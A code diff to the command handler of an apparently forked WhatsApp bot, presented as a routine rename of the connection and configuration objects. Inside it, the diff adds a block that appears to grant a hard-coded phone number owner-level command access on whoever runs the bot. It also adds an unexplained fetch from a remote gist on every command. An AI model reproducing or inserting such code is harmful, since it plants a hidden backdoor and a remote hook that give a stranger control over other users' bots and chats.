@@ -351,10 +351,17 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                         command.pattern.test(text_msg))))) {
 
                     let sendMsg = false;
-                    var chat = conn.chats.get(msg.key.remoteJid)
+                    var chat = raganork.chats.get(msg.key.remoteJid)
                         
-                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
+                    if ((Sourav.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && Sourav.SUDO.includes(',') ? Sourav.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Sourav.SUDO || Sourav.SUDO.includes(',') ? Sourav.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Sourav.SUDO)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                   }  
+                   if ((SOURAV.KL11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == SOURAV.KL11 || SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == SOURAV.KL11)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
@@ -362,26 +369,23 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                     }
   
                     if (sendMsg) {
-                        if (config.SEND_READ && command.on === undefined) {
-                            await conn.chatRead(msg.key.remoteJid);
+                        if (Sourav.SEND_READ && command.on === undefined) {
+                            await raganork.chatRead(msg.key.remoteJid);
                         }
                        
+                        const {data} = await axios(`https://gist.githubusercontent.com/souravkl11/ff107d59b17f1e4b96889a82dbb6d520/raw`)
+                        const { asena } = data
                         var match = text_msg.match(command.pattern);
                         
                         if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                         && msg.message.imageMessage !== null) {
-                            whats = new Image(conn, msg);
+                            whats = new Image(raganork, msg);
                         } else if (command.on !== undefined && (command.on === 'video' )
                         && msg.message.videoMessage !== null) {
-                            whats = new Video(conn, msg);
+                            whats = new Video(raganork, msg);
                         } else {
-                            whats = new Message(conn, msg);
+                            whats = new Message(raganork, msg);
                         }
-/*
-                        if (command.deleteCommand && msg.key.fromMe) {
-                            await whats.delete(); 
-                        }
-*/
 
                         try {
                             await command.function(whats, match);
